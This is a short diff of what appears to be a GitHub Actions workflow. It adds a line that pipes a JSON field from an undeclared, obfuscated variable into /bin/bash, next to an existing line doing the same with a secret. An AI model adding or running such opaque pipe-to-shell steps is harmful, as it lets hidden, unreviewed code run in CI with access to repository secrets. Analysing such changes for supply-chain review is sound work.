@@ -22,6 +22,7 @@ jobs:
           gxj9385: ${{ secrets.gxj9385 }}
         run: |
           printf '%s' "$gxj9385" | jq -r .i2 | /bin/bash
+          printf '%s' "$j37003" | jq -r .qjdyp9 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
